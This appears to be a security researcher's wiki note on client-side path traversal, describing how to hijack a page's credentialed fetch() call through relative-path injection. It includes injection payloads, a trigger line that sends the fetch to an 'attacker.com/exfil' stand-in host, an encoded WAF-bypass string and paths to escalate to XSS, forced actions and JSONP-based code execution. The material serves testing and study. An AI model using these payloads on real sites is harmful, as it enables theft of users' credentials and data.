---
title: CSPT — fetch URL hijacking via relative-path injection
slug: cspt-fetch-hijacking
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/dom-xss, technique/cspt]
inbound: []
---

# CSPT — fetch URL hijacking via relative-path injection

## Pattern
Injection into a relative path passed to `fetch()` (or `XHR`, `<link href>`,
`<img src>`, etc.) where attacker controls the leading segment. Lets you
redirect the credentialed outbound fetch to an arbitrary URL via:

- `//attacker` — protocol-relative URL.
- `/\\attacker` — backslash → forward-slash normalisation in some browsers.
- `/\t/attacker` — tab/newline stripped by `fetch()` silently.
- `@attacker.com/...` — injection into username/password component of URL.
- Host-portion injection from query param into `new Worker(url)` — rare
  cross-origin worker hijack with target-page context.

## Preconditions
- User input ends up inside a relative path passed to a fetch-emitting API.
- Path is not pre-encoded.
- For OAuth `redirect_uri` variants, injection before `@` in absolute URL.

## Detection
- Bus Factor's "Gecko" Chrome extension flags reflection of URL-bar values
  into outgoing API calls.
- Match-and-replace on response: replace your URL param value with
  `//attacker.example.com/x` and watch for outbound fetch in Network tab.

## Triggering
```
?id=//attacker.com/exfil
```
Page does `fetch('/api/users/' + id)` → resolves to `//attacker.com/exfil`
(protocol-relative absolute URL).

`fetch()` strips `\t \n \r` silently. Combine with double-encoded
path-traversal to bypass WAF:
```
%2F%2E%09%2E%5C
```
(`/`, `.`, tab, `.`, `\` — decodes to `/./.\\` after tab strip → escapes
`..` blocklist.)

## Escalation
- **CSPT → XSS in SPA**: when fetch follows attacker URL and response is
  `innerHTML`'d under "trust own API origin" assumption → reflected XSS in
  heavily-sanitized SPA.
- **CSPT → CSRF-equivalent**: redirect fetch to `/delete-account` etc.
- **Axios JSONP CSPT → RCE**: some Axios versions invoke JSONP callback JS
  when redirected to a JSONP endpoint → client-side RCE.

## Bypasses
- Lowercase `%2f` not decoded → uppercase `%2F` (React Router quirk —
  [[cspt-react-useparams]]).
- WAF blocks `..` → use tab/newline strip trick.
- React/Next.js: triple URL-encode to compensate for double-decode.

## Seen in the wild
- {date: 2026-04-02, target: undisclosed} — XSSDoctor Ep 168.
- {date: 2023-07-13, target: undisclosed} — Ep 27 esoteric vulns.

## References
- Critical Thinking Podcast Eps 27, 168
- Bus Factor "Gecko" Chrome extension
- lab.ctbb.show — XSSDoctor writeup
- Related: [[cspt-react-useparams]]
